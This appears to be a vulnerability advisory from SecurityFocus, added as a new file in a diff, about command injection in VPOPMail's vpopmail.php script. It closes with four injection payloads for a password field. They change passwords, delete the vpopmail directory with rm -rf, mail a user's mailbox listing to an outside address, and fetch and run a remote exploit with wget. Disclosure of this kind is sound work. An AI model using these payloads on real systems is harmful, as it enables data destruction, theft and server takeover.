@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/7063/info
+
+A vulnerability has been reported for VPOPMail that may allow attackers to execute arbitrary commands on a vulnerable system. The vulnerability exists due to insufficient sanitization of user-supplied input.
+
+As the vpopmail.php script does not properly sanitize the values for the some variables, it is possible for an attacker to include malicious system commands by manipulating URI parameters. This would in turn result in the execution of these commands with the privileges of the web server process.
+
+password;~vpopmail/bin/vpasswd user@host password
+password;rm -rf ~vpopmail/
+password;ls ~vpopmail/domains/example.com/user/Maildir/new| mail user@host
+passwd; wget example.com/exploit -O /tmp/f;chmod +x /tmp/f;/tmp/f;
